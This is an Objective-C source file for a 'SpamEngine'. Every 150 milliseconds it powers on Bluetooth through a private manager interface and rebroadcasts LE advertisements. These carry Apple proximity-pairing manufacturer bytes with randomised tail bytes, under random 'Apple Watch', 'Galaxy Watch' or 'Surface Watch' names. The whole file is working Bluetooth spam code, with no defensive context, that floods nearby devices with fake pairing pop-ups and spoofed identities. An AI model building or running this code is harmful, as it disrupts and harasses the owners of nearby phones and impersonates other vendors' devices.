#import "SpamEngine.h"
#import <CoreBluetooth/CoreBluetooth.h>
#import <objc/runtime.h>

@interface BluetoothManager : NSObject
+ (instancetype)sharedInstance;
- (void)setPowered:(BOOL)arg1;
- (BOOL)powered;
- (void)setDeviceName:(NSString *)name;
- (void)startAdvertising:(NSData *)advData;
- (void)stopAdvertising;
@end

@implementation SpamEngine {
    dispatch_source_t _timer;
    NSInteger _mode;
}

+ (instancetype)shared {
    static SpamEngine *s; static dispatch_once_t t;
    dispatch_once(&t, ^{ s = [SpamEngine new]; });
    return s;
}

- (void)startMode:(NSInteger)mode {
    [self stop];
    _mode = mode;
    _timer = dispatch_source_create(DISPATCH_SOURCE_TYPE_TIMER, 0, 0, dispatch_get_main_queue());
    dispatch_source_set_timer(_timer, dispatch_time(DISPATCH_TIME_NOW, 0), 150 * NSEC_PER_MSEC, 0);
    dispatch_source_set_event_handler(_timer, ^{ [self tick]; });
    dispatch_resume(_timer);
}

- (void)stop {
    if (_timer) { dispatch_source_cancel(_timer); _timer = NULL; }
    [[BluetoothManager sharedInstance] stopAdvertising];
}

- (void)tick {
    BluetoothManager *bm = [BluetoothManager sharedInstance];
    if (![bm powered]) [bm setPowered:YES];

    uint8_t buf[10] = {0x4C, 0x00, 0x07, 0x01, 0x0D, 0x20, 0x2E, 0x00,
                       (uint8_t)(arc4random() & 0xFF), (uint8_t)(arc4random() & 0xFF)};
    NSData *adv = [NSData dataWithBytes:buf length:sizeof(buf)];

    if (_mode == 0) {
        [bm setDeviceName:[NSString stringWithFormat:@"Apple Watch %04X", arc4random() & 0xFFFF]];
    } else if (_mode == 1) {
        [bm setDeviceName:[NSString stringWithFormat:@"Galaxy Watch %04X", arc4random() & 0xFFFF]];
    } else if (_mode == 2) {
        [bm setDeviceName:[NSString stringWithFormat:@"Surface Watch %04X", arc4random() & 0xFFFF]];
    } else {
        [bm setDeviceName:[NSString stringWithFormat:@"Watch %04X", arc4random() & 0xFFFF]];
    }
    [bm stopAdvertising];
    [bm startAdvertising:adv];
}
@end
